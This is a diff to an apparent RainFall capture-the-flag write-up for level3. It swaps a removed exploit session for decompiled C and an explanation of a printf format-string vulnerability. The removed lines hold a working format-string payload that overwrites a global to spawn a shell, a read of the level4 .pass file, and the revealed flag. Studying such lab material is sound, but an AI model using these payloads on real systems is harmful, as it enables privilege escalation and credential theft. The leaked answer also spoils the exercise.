@@ -1,13 +1,24 @@
 Decompiled version of the program from BinaryNinja:
 
 ```c
-level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "%60d%4$n"'; cat) | ./level3 
-�                                                           
-Wait what?!
-whoami
-level4
-cat /home/user/level4/.pass
-b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+uint32_t v()
+{
+    void var_20c;
+    fgets(&var_20c, 0x200, stdin);
+    printf(&var_20c);
+    uint32_t eax = m;
+    if (eax == 0x40)
+    {
+        fwrite("Wait what?!\n", 1, 0xc, stdout);
+        eax = system("/bin/sh");
+    }
+    return eax;
+}
+
+int32_t main(int32_t argc, char** argv, char** envp)
+{
+    return v();
+}
 ```
 
 A vulnerability in the form of a format string attack can be directly observed on the printf function, as it is called in this manner: `printf(&var_20c)`. This enables us to read and overwrite the stack. The objective here seems to be rewriting the value of EAX in order to invoke /bin/sh as user level4.
